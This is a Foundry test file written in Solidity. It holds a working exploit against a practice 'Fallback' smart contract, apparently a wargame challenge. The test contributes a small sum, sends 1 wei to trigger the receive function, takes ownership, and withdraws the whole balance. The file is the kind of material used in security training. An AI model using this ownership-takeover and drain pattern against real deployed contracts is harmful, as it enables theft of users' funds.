// SPDX-License-Identifier: MIT

pragma solidity ^0.8.20;

import {Test, console} from "forge-std/Test.sol";
import {Fallback} from "../src/Fallback.sol";

contract FallbackTest is Test {
    Fallback public fallbackContract;
    address public attacker = makeAddr("attacker");

    function setUp() public {
        fallbackContract = new Fallback();
        vm.deal(attacker, 1 ether);
    }

    function testExploit() public {
        vm.startPrank(attacker);

        // Step 1: Send some ether to the contract
        fallbackContract.contribute{value: 0.0005 ether}();

        // Step 2: Send some ether directly to execute the `receive` function
        (bool success, ) = address(fallbackContract).call{value: 1 wei}("");
        require(success, "Transfer failed");

        // Step 3: Check we got the ownership of the contract
        assertEq(fallbackContract.owner(), attacker);

        // Step 4: Execute the withdraw function
        fallbackContract.withdraw();

        // Step 5: Balance token drained successfully
        assertEq(address(fallbackContract).balance, 0);

        vm.stopPrank();
    }
}
